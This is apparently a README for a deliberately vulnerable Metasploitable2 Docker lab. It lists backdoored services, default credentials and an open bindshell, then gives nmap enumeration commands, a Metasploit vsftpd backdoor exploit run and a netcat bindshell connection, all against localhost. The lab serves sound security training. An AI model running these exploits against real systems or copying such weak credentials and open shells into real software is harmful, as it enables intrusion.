# Privilege Escalation Target

Metasploitable2 - A purposefully vulnerable Linux system for practicing exploitation and privilege escalation.

## 🎯 Metasploitable2

A vulnerable Ubuntu Linux virtual machine designed for security training.

### 📋 Exposed Services

| Port | Service | Notes |
|------|---------|-------|
| 8021 | FTP (vsftpd 2.3.4) | Backdoor vulnerability |
| 8022 | SSH | Weak credentials |
| 8023 | Telnet | Weak credentials |
| 8025 | SMTP | Mail server |
| 8080 | HTTP | Multiple web vulnerabilities |
| 8139 | Samba | File sharing (SMB) |
| 8445 | Samba | File sharing (SMB) |
| 1524 | Bindshell | Direct shell access |
| 3306 | MySQL | Database (root:no password) |
| 5432 | PostgreSQL | Database |
| 6667 | IRC | UnrealIRCd backdoor |
| 8180 | Tomcat | Web application server |

### 🔑 Default Credentials

- **SSH/Telnet:** msfadmin:msfadmin
- **MySQL:** root:(no password)
- **PostgreSQL:** postgres:postgres

## 🎓 Learning Objectives

1. **Enumeration**
   - Port scanning
   - Service fingerprinting
   - Vulnerability identification

2. **Exploitation**
   - Known CVE exploitation
   - Service-specific attacks
   - Web application vulnerabilities

3. **Privilege Escalation**
   - Kernel exploits
   - SUID binaries
   - Misconfigured services
   - Weak file permissions

4. **Post-Exploitation**
   - Lateral movement
   - Data exfiltration
   - Persistence mechanisms

## 🛠️ Practice Scenarios

### Beginner
- FTP backdoor exploitation (vsftpd 2.3.4)
- SSH brute force
- Anonymous FTP access
- Bindshell on port 1524

### Intermediate
- IRC UnrealIRCd backdoor
- Samba exploits
- Web application attacks
- Database exploitation

### Advanced
- Privilege escalation paths
- Kernel exploits
- Creating persistent access
- Pivoting techniques

## 🚀 Usage

```bash
# Start Metasploitable2
docker-compose up -d

# Check running services
docker-compose ps

# View logs
docker-compose logs -f

# Stop the target
docker-compose down
```

## 🔍 Enumeration Examples

```bash
# Full port scan
nmap -p- -sV localhost

# Scan specific ports
nmap -p 8021,8022,8080 -sV -sC localhost

# Vulnerability scan with nmap scripts
nmap -p 8021 --script ftp-vsftpd-backdoor localhost
nmap -p 8139,8445 --script smb-vuln-* localhost
```

## 🎯 Exploitation Examples

```bash
# Using Metasploit
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST localhost
set RPORT 8021
exploit

# SSH login
ssh msfadmin@localhost -p 8022
# Password: msfadmin

# Bindshell connection
nc localhost 1524

# MySQL connection
mysql -h localhost -P 3306 -u root
```

## ⚠️ Important Notes

- This container runs in privileged mode for full functionality
- Multiple known vulnerabilities are present by design
- Perfect for practicing with Metasploit Framework
- Great for learning manual exploitation techniques
- Use ONLY in isolated environments
